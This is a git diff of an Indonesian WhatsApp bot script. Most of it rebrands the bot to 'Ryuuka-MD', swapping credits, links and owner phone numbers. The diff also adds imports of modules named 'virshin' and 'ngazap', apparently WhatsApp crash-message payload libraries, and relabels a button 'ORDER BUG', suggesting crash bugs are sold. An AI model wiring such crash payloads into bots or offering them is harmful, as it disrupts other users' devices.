@@ -74,6 +74,8 @@ const { vweb6 } = require('./Lib/vweb6')
 const { ngazapv1 } = require('./Lib/ngazapv1')
 const { ngazapv2 } = require('./Lib/ngazapv2')
 const { ngazapv3 } = require('./Lib/ngazapv3')
+const { virshin } = require('./Lib/virshin.js');
+const { ngazap } = require('./Lib/ngazap.js');
 const { cerpen } = require('./Lib/cerpen')
 const { pinterest } = require('./Lib/scraper')
 const { idML } = require('./Lib/stalkml')
@@ -156,7 +158,7 @@ try {
         },
         message: {
         locationMessage: {
-        name: `I’m From Indonesia 🇮🇩`,
+        name: `⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫 🇮🇩`,
         jpegThumbnail: thumb
         }
         }
@@ -169,7 +171,7 @@ try {
         ...({ remoteJid: "" }),
         message: {
         locationMessage: {
-        name: `I’m From Indonesia 🇮🇩`,
+        name: `⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫 🇮🇩`,
         jpegThumbnail: thumb
         }
         }
@@ -247,7 +249,7 @@ try {
 console.error(err)
 }
 
-            if (!kirbotz.public) {
+            if (!kirbotz.self) {
             if (!m.key.fromMe) return
             }
 
@@ -347,8 +349,8 @@ img: await resz.getBufferAsync(jimp.MIME_JPEG)
         "mediaType": 2, 
         "thumbnail": ppnyauser,
         "previewType": "VIDEO",
-        "mediaUrl": `https://youtu.be/b0CCKgVEhlk`,
-        "sourceUrl": `https://youtu.be/b0CCKgVEhlk`}}},
+        "mediaUrl": `https://youtu.be/YaUspNsn8po`,
+        "sourceUrl": `https://youtu.be/YaUspNsn8po`}}},
         { quoted: m })
         }
 	
@@ -377,12 +379,12 @@ message: {
             isForwarded:true, 
             mentionedJid: [m.sender],
 			externalAdReply: { 
-			title: "I'm From Indonesia 🇲🇨", 
+			title: "⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫 🇮🇩", 
 			mediaType: 1, 
 			body: "Website Owner", 
 			thumbnail: ppnyauser, 
 			previewType: "FOTO",
-			sourceUrl: `https://chat.whatsapp.com/CswK4kvQD1u7SfSmsYfMHZ`}}}, 
+			sourceUrl: `https://chat.whatsapp.com/DCxtgahuPpaHhS7FbiCxza`}}}, 
 			{ quoted: floc })
 		}
 
@@ -484,7 +486,7 @@ const fakekirbotz = {
   message: {
     imageMessage: {
       mimetype: 'image/jpeg',
-      caption: 'Created By Wz Botz',
+      caption: '⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
       jpegThumbnail: ppnyauser,
       viewOnce: true
     }
@@ -588,7 +590,7 @@ kirbotz.relayMessage(jid, order.message, { messageId: order.key.id})
  × ${prefix}sellbesi
  × ${prefix}sellemas
  × ${prefix}selldiamond`
-        kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: thumbrpg }, templateButtons: button, footer: `Rpg Game By NabbBotz`, mentions: [sender] })
+        kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: thumbrpg }, templateButtons: button, footer: `Rpg Game By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫`, mentions: [sender] })
         .catch ((err) => reply(err))
         }
         
@@ -614,7 +616,7 @@ kirbotz.relayMessage(jid, order.message, { messageId: order.key.id})
  • Status : ${elit}
  • Xp :  ${getLevelingXp(sender)}/${reqXp}
 「 RPG GAME 」`
-        kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imgjoinrpg }, templateButtons: button, footer: `Rpg Game By NabbBotz`, mentions: [sender] })
+        kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imgjoinrpg }, templateButtons: button, footer: `Rpg Game By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫`, mentions: [sender] })
         .catch ((err) => reply(err))
         }
         
@@ -636,7 +638,7 @@ addDm(sender, d)
 		{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
 		]
         var hg = `☠️ 𝗠𝗶𝘀𝗶 𝗠𝗲𝗺𝗯𝘂𝗻𝘂𝗵 𝗦𝗹𝗶𝗺𝗲️\n\n🎁 Hadiah Membunuh Slime\n • Uang : $${b}\n • Besi : ${c}\n • Emas : ${a}\n • Diamond : ${d}\n\nTerimakasih Telah Menjalankan Misi Ini>_<`
-        kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imgslime }, templateButtons: button, footer: `Rpg Game By NabbBotz`, mentions: [sender] })
+        kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imgslime }, templateButtons: button, footer: `Rpg Game By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫`, mentions: [sender] })
         .catch ((err) => reply(err))
         }
         
@@ -658,7 +660,7 @@ var button = [
 		{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
 		]
 var hg = `☠️ 𝗠𝗶𝘀𝗶 𝗠𝗲𝗺𝗯𝘂𝗻𝘂𝗵 𝗚𝗼𝗯𝗹𝗶𝗻\n\n🎁 Hadiah Membunuh Goblin\n • Uang : $${b}\n • Besi : ${c}\n • Emas : ${a}\n • Diamond : ${d}\n\nTerimakasih Telah Menjalankan Misi Ini>_<`
-kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imggoblin }, templateButtons: button, footer: `Rpg Game By NabbBotz`, mentions: [sender] })
+kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imggoblin }, templateButtons: button, footer: `Rpg Game By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫`, mentions: [sender] })
         .catch ((err) => reply(err))
         }
         
@@ -680,7 +682,7 @@ var button = [
 		{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
 		]
 var hg = `☠️ 𝗠𝗶𝘀𝗶 𝗠𝗲𝗺𝗯𝘂𝗻𝘂𝗵 𝗗𝗲𝘃𝗶𝗹️\n\n🎁 Hadiah Membunuh Devil\n • Uang : $${b}\n • Besi : ${c}\n • Emas : ${a}\n • Diamond : ${d}\n\nTerimakasih Telah Menjalankan Misi Ini>_<`
-kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imgdevil }, templateButtons: button, footer: `Rpg Game By NabbBotz`, mentions: [sender] })
+kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imgdevil }, templateButtons: button, footer: `Rpg Game By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫`, mentions: [sender] })
         .catch ((err) => reply(err))
         }
         
@@ -702,7 +704,7 @@ var button = [
 		{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
 		]
 var hg = `☠️ 𝗠𝗶𝘀𝗶 𝗠𝗲𝗺𝗯𝘂𝗻𝘂𝗵 𝗕𝗲𝗵𝗲𝗺𝗼𝘁𝗵️\n\n🎁 Hadiah Membunuh Behemoth\n • Uang : $${b}\n • Besi : ${c}\n • Emas : ${a}\n • Diamond : ${d}\n\nTerimakasih Telah Menjalankan Misi Ini>_<`
-kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imgbehemoth }, templateButtons: button, footer: `Rpg Game By NabbBotz`, mentions: [sender] })
+kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imgbehemoth }, templateButtons: button, footer: `Rpg Game By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫`, mentions: [sender] })
         .catch ((err) => reply(err))
         }
         
@@ -724,7 +726,7 @@ var button = [
 		{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
 		]
 var hg = `☠️ 𝗠𝗶𝘀𝗶 𝗠𝗲𝗺𝗯𝘂𝗻𝘂𝗵 𝗗𝗲𝗺𝗼𝗻️\n\n🎁 Hadiah Membunuh Demond\n • Uang : $${b}\n • Besi : ${c}\n • Emas : ${a}\n • Diamond : ${d}\n\nTerimakasih Telah Menjalankan Misi Ini>_<`
-kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imgdemon }, templateButtons: button, footer: `Rpg Game By NabbBotz`, mentions: [sender] })
+kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imgdemon }, templateButtons: button, footer: `Rpg Game By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫`, mentions: [sender] })
         .catch ((err) => reply(err))
         }
         
@@ -742,7 +744,7 @@ var button = [
 		{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
 		]
 var hg = `☠️ 𝗠𝗶𝘀𝗶 𝗠𝗲𝗺𝗯𝘂𝗻𝘂𝗵 𝗗𝗲𝗺𝗼𝗻𝗞𝗶𝗻𝗴\n\n🎁 Hadiah Membunuh DemonKing\n • Uang : $${b}\n • Besi : ${c}\n • Emas : ${a}\n • Diamond : ${d}\n\nTerimakasih Telah Menjalankan Misi Ini>_<`
-kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imgdemonking }, templateButtons: button, footer: `Rpg Game By NabbBotz`, mentions: [sender] })
+kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imgdemonking }, templateButtons: button, footer: `Rpg Game By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫`, mentions: [sender] })
         .catch ((err) => reply(err))
         }
         
@@ -753,7 +755,7 @@ async function replyTemplate(teks) {
                                         	  ]                 
                        const buttonMessage = { 
                                     text: teks, 
-                                    footer: "Bot by Nabb Botz", 
+                                    footer: "⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫", 
                                     templateButtons: buttonsDefault, 
                                     image: {url: thumb}                                   
                                                }
@@ -766,7 +768,7 @@ async function replyOwnerr(teks) {
                                         	  ]                 
                        const buttonMessage = { 
                                     text: teks, 
-                                    footer: "Bot by Nabb Botz", 
+                                    footer: "⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫", 
                                     templateButtons: buttonsDefault, 
                                     image: {url: thumb}                                   
                                                }
@@ -777,7 +779,7 @@ async function replyNya(teks) {
                        const buttonsDefault = []                 
                        const buttonMessage = { 
                                     text: teks, 
-                                    footer: "© BOT WHATSAPP 2022", 
+                                    footer: "© Ｒｙｕｕｋａ－ＭＤ 仫", 
                                     templateButtons: buttonsDefault, 
                                     image: {url: thumb}                                   
                                                }
@@ -788,7 +790,7 @@ async function replyBan(teks) {
                        const buttonsDefault = [{ urlButton: { displayText: `MyOwner`, url : `${wame}` } }]                 
                        const buttonMessage = { 
                                     text: teks, 
-                                    footer: "© BOT WHATSAPP 2022", 
+                                    footer: "© Ｒｙｕｕｋａ－ＭＤ 仫", 
                                     templateButtons: buttonsDefault, 
                                     image: {url: thumb}                                   
                                                }
@@ -802,7 +804,7 @@ async function replyPremium(teks) {
                                         	  ]                 
                        const buttonMessage = { 
                                     text: teks, 
-                                    footer: "Bot by Nabb Botz", 
+                                    footer: "⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫z", 
                                     templateButtons: buttonsDefault, 
                                     image: {url: thumb}                                   
                                                }
@@ -811,8 +813,8 @@ async function replyPremium(teks) {
                 
 async function sendBut5nya(teks) {
 var button = [
-{"urlButton": {"displayText": "MyOwner🔥","url": `https://wa.me/62882016646288`}},
-{"quickReplyButton": {"displayText": "Sewabot","id": 'sewabot'}},
+{"urlButton": {"displayText": "MyOwner🔥","url": `https://wa.me/6282134110253`}},
+{"quickReplyButton": {"displayText": "ORDER BUG","id": 'sewabot'}},
 {"quickReplyButton": {"displayText": "Donasi","id": 'donasi'}},
 {"quickReplyButton": {"displayText": "Status Botz","id": 'ping'}}
 		]
@@ -860,7 +862,7 @@ if (!isCreator) return reply(mess.owner)
 if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 if (!args[0]) return reply("Mau ngambil case apa?")
 try {
-reply(`// Created By Wz Botz\n` + 'case ' + `'${args[0]}'` + fs.readFileSync('./kirbotz.js').toString().split(`case '${args[0]}'`)[1].split(turbrek)[0] + turbrek)
+reply(`// Created By Ryuuka\n` + 'case ' + `'${args[0]}'` + fs.readFileSync('./kirbotz.js').toString().split(`case '${args[0]}'`)[1].split(turbrek)[0] + turbrek)
 } catch {
 reply("Case Tidak Ditemukan")
 }
@@ -908,7 +910,7 @@ let fejfjej = [
 ]
 }
 ]
-kirbotz.sendList(m.chat, `Haii *${pushname}*`, `Silahkan Pilih Di Bawah`, "CLICK", "Fitur Nulis By NabbBotz ", fejfjej, { quoted: m })
+kirbotz.sendList(m.chat, `Haii *${pushname}*`, `Silahkan Pilih Di Bawah`, "CLICK", "Fitur Nulis By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫 ", fejfjej, { quoted: m })
 break
 case 'nuliskiri':{
 if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
@@ -1053,7 +1055,7 @@ let secmmknya = [
 ]
 }
 ]
-kirbotz.sendList(m.chat, `Haii *${pushname}*`, `Silahkan Pilih Di Bawah`, "CLICK", "Topup Game By NabbBotz ", secmmknya, { quoted: efff })
+kirbotz.sendList(m.chat, `Haii *${pushname}*`, `Silahkan Pilih Di Bawah`, "CLICK", "Topup Game By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫 ", secmmknya, { quoted: efff })
 break
 case 'topup5':{
 if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
@@ -1078,7 +1080,7 @@ hydratedButtons: [
 {
 urlButton: {
 displayText: 'Owner Bot',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 }]
 }
@@ -1110,7 +1112,7 @@ hydratedButtons: [
 {
 urlButton: {
 displayText: 'Owner Bot',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 }]
 }
@@ -1142,7 +1144,7 @@ hydratedButtons: [
 {
 urlButton: {
 displayText: 'Owner Bot',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 }]
 }
@@ -1174,7 +1176,7 @@ hydratedButtons: [
 {
 urlButton: {
 displayText: 'Owner Bot',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 }]
 }
@@ -1206,7 +1208,7 @@ hydratedButtons: [
 {
 urlButton: {
 displayText: 'Owner Bot',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 }]
 }
@@ -1238,7 +1240,7 @@ hydratedButtons: [
 {
 urlButton: {
 displayText: 'Owner Bot',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 }]
 }
@@ -1270,7 +1272,7 @@ hydratedButtons: [
 {
 urlButton: {
 displayText: 'Owner Bot',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 }]
 }
@@ -1330,7 +1332,7 @@ ppuser = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gam
 }
 kirbotz.sendMessage(m.chat, { image: { url: ppuser }, caption: texnr, mentions: await kirbotz.parseMention(texnr), contextInfo:{externalAdReply:{
 title:"WhatsApp Bot Multi Device",
-body:"By NabbBotz",
+body:"By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫",
 thumbnail: ppnyauser,
 mediaType:2,
 mediaUrl: "https://youtu.be/b0CCKgVEhlk",
@@ -1559,17 +1561,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: `Gelap Bos:v`,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Next","id": `${prefix+command}`}}]
@@ -1594,17 +1596,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: `Gelap Bos:v`,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Next","id": `${prefix+command}`}}]
@@ -1629,17 +1631,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: `Gelap Bos:v`,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Next","id": `${prefix+command}`}}]
@@ -1664,17 +1666,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: `Gelap Bos:v`,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Next","id": `${prefix+command}`}}]
@@ -1699,17 +1701,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: `Gelap Bos:v`,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Next","id": `${prefix+command}`}}]
@@ -1787,7 +1789,7 @@ kirbotz.sendContact(m.chat, global.owner, m)
 }
 break
 case 'credits':
-const sokl = "6288991078377@s.whatsapp.net"
+const sokl = "6282134110253@s.whatsapp.net"
 const sokd = "6281259121031@s.whatsapp.net"
 const soka = "62881038149808@s.whatsapp.net"
 const sokdi = "6288292024190@s.whatsapp.net"
@@ -1800,7 +1802,7 @@ const sokrz = "6288226703423@s.whatsapp.net"
 const sokha = "6281385062956@s.whatsapp.net"
 const sokyu = "6281370435024@s.whatsapp.net"
 teksits = `「 *Thanks To* 」
-♕ Nabb Botz @${sokl.split("@")[0]}
+♕ Ryuuka XD @${sokl.split("@")[0]}
 ♕ Dinata @${sokd.split("@")[0]}
 ♕ Ardy @${soka.split("@")[0]}
 ♕ DikaArtdnt. @${sokdi.split("@")[0]}
@@ -1820,8 +1822,8 @@ kirbotz.sendMessage(m.chat, { image: ppnyauser, caption: teksits, contextInfo: {
 "mediaType": 2, 
 "thumbnail": ppnyauser,
 "previewType": "VIDEO",
-"mediaUrl": 'https://chat.whatsapp.com/CswK4kvQD1u7SfSmsYfMHZ',
-"sourceUrl": 'https://chat.whatsapp.com/CswK4kvQD1u7SfSmsYfMHZ'
+"mediaUrl": 'https://chat.whatsapp.com/DCxtgahuPpaHhS7FbiCxza',
+"sourceUrl": 'https://chat.whatsapp.com/DCxtgahuPpaHhS7FbiCxza'
 }}}, { quoted: fakekirbotz })
 break
 case 'quest':
@@ -1894,7 +1896,7 @@ let sectionnya= [
 ]
 }
 ]
-kirbotz.sendList(m.chat, `Haii *${pushname}*`, `Silahkan Pilih Di Bawah`, "CLICK", "Rpg Game By NabbBotz ", sectionnya, { quoted: fakekirbotz})
+kirbotz.sendList(m.chat, `Haii *${pushname}*`, `Silahkan Pilih Di Bawah`, "CLICK", "Rpg Game By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫 ", sectionnya, { quoted: fakekirbotz})
 break
 case 'slime':
 case 'killslime':
@@ -1943,7 +1945,7 @@ if (!m.isGroup) return replyNya(mess.group)
 if (!isPetualang) return replyNya(mess.noPetualang)
 await sendButdemonking(from)
 break
-case 'groupNabb Botz': {
+case 'groupryuuka': {
 await replyTemplate(`${gckirbotz}\nGak Join Awas Di Ban Kau`)
 }
 break
@@ -1951,18 +1953,18 @@ case 'menu':
 if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 let timestamp = speed()
 let latensi = speed() - timestamp
-const botzkir = "6288991078377@s.whatsapp.net"
+const botzkir = "6282134110253@s.whatsapp.net"
 var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
 var bykir = rndm[Math.floor(Math.random() * rndm.length)]
 mbc = `Hai Kak @${sender.split("@")[0]} 
-Saya KirBotz Saya Disini Ingin Membantu Kalian Membuat Sticker Download Video/Lagu Youtube, Tiktok Dll.`
+Saya ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫 Saya Disini Ingin Membantu Kalian Membuat Sticker Download Video/Lagu Youtube, Tiktok Dll.`
 let buttons = [
-{buttonId: `${prefix}rpgmenu`, buttonText: {displayText: 'Rpg Menu'}, type: 1},
+{buttonId: `${prefix}creator`, buttonText: {displayText: 'Owner Nya Deck'}, type: 1},
 {buttonId: `${prefix}allmenu`, buttonText: {displayText: 'All Menu'}, type: 1}
 ]
 let buttonMessage = {
 document: fs.readFileSync('./Image/memeknya.jpg'), 
-fileName: `Bot by Nabb Botz`, 
+fileName: `⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫`, 
 mimetype: `application/${bykir}`,
 jpegThumbnail: thumb,
 caption: mbc,
@@ -1979,8 +1981,8 @@ contextInfo: {
 "mediaType": 2, 
 "thumbnail": ppnyauser,
 "previewType": "VIDEO",
-"mediaUrl": 'https://youtu.be/b0CCKgVEhlk',
-"sourceUrl": 'https://chat.whatsapp.com/CswK4kvQD1u7SfSmsYfMHZ'
+"mediaUrl": 'https://youtu.be/YaUspNsn8po',
+"sourceUrl": 'https://chat.whatsapp.com/DCxtgahuPpaHhS7FbiCxza'
 }}
 }
 kirbotz.sendMessage(m.chat, buttonMessage, { quoted: {
@@ -1994,7 +1996,7 @@ kirbotz.sendMessage(m.chat, buttonMessage, { quoted: {
 				    itemCount: 99999999,
 				    status: 1,
 				    surface: 1,
-				    message: 'Created By Wz Botz',
+				    message: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 				    orderTitle: '999999999', 
 				    sellerJid: `0@s.whatsapp.net` 
 				   }
@@ -2062,7 +2064,7 @@ await sendBut5nya(`──────〇『 ${ya}Info User${ya} 』
 ┌──『 ${ya}Other Menu${ya} 』
 │ ${ya}${Yy+=1} ${prefix}owner${ya}
 │ ${ya}${Yy+=1} ${prefix}credits${ya}
-│ ${ya}${Yy+=1} ${prefix}groupNabb Botz${ya}
+│ ${ya}${Yy+=1} ${prefix}groupRyuuka${ya}
 │ ${ya}${Yy+=1} ${prefix}readmore${ya}
 │ ${ya}${Yy+=1} ${prefix}rules${ya}
 │ ${ya}${Yy+=1} ${prefix}donasi${ya}
@@ -2629,7 +2631,7 @@ displayText: 'M E N U',
 id: `${prefix}menu`
 }
 }]
-kirbotz.send5Loc(m.chat, `On Kak Silahkan Pencet Button Di Bawah\nJika Button Tidak Kelihatan Ketik ${prefix}menu`, `Created By Wz Botz`, global.thumb, btn)
+kirbotz.send5Loc(m.chat, `On Kak Silahkan Pencet Button Di Bawah\nJika Button Tidak Kelihatan Ketik ${prefix}menu`, `Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫`, global.thumb, btn)
 }
 break
 case 'Assalamualaikum': case 'assalamualaikum':{
@@ -2652,7 +2654,7 @@ ules = `${ucapanWaktu} 𝐊𝐚𝐤 *${pushname}*
       *sᴀɴᴋsɪ : ʙʟᴏᴄᴋ ᴘᴇʀᴍᴀɴᴇɴ*
 
 𒍮 𝑶𝒘𝒏𝒆𝒓 𝑩𝒐𝒕𝒛 ↓↓
-_*https://wa.me/62882016646288*_`
+_*https://wa.me/6282134110253*_`
 let message = await prepareWAMessageMedia({ image: fs.readFileSync('./Image/kirbotz.jpg') }, { upload: kirbotz.waUploadToServer })
 const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 templateMessage: {
@@ -2728,10 +2730,10 @@ if (/webp/.test(mime)) {
 kirbotz.sendMessage(i, { sticker: { url: media } }, { quoted: m })
 } else if (/image/.test(mime)) {
 let junn = `*_BROADCAST IMAGE_*${text ? '\n\n' + text : ''}`
-kirbotz.send5ButImg(i, junn, `Created By Wz Botz`, buffer, butoon)
+kirbotz.send5ButImg(i, junn, `Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫`, buffer, butoon)
 } else if (/video/.test(mime)) {
 let junn = `*_BROADCAST VIDIO_*${text ? '\n\n' + text : ''}`
-kirbotz.send5Vid(i, junn, `Created By Wz Botz`, buffer, butoon)
+kirbotz.send5Vid(i, junn, `Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫`, buffer, butoon)
 } else if (/audio/.test(mime)) {
 kirbotz.sendMessage(i, {audio: buffer, mimetype: 'audio/mpeg'}, { quoted : m })
 } else {
@@ -2827,17 +2829,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: pll,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Next","id": `${prefix+command}`}}]
@@ -2918,13 +2920,13 @@ kirbotz.groupLeave(from)
 break
 case 'public': {
 if (!isCreator) return replyNya(mess.owner)
-kirbotz.public = true
+kirbotz.self = true
 replyNya('Sukses Kak')
 }
 break
 case 'self': {
 if (!isCreator) return replyNya(mess.owner)
-kirbotz.public = false
+kirbotz.self = false
 replyNya('Sukses Kak')
 }
 break
@@ -3039,6 +3041,14 @@ replyNya (`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1
 }
 }
 break
+case 'setexif': {
+               if (!isCreator) return reply(mess.owner)
+               if (!text) return m.reply(`Example : ${prefix + command} packname|author`)
+          global.packname = text.split("|")[0]
+          global.author = text.split("|")[1]
+          m.reply(`Exif berhasil diubah menjadi\n\n*Packname* : ${global.packname}\n*Author* : ${global.author}`)
+            }
+            break
 case 'emojimix': {
 if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 
@@ -3728,17 +3738,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: ini_txt,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
@@ -3883,17 +3893,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: ini_txt,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
@@ -3941,17 +3951,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: ini_txt,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
@@ -3977,17 +3987,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: ini_txt,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
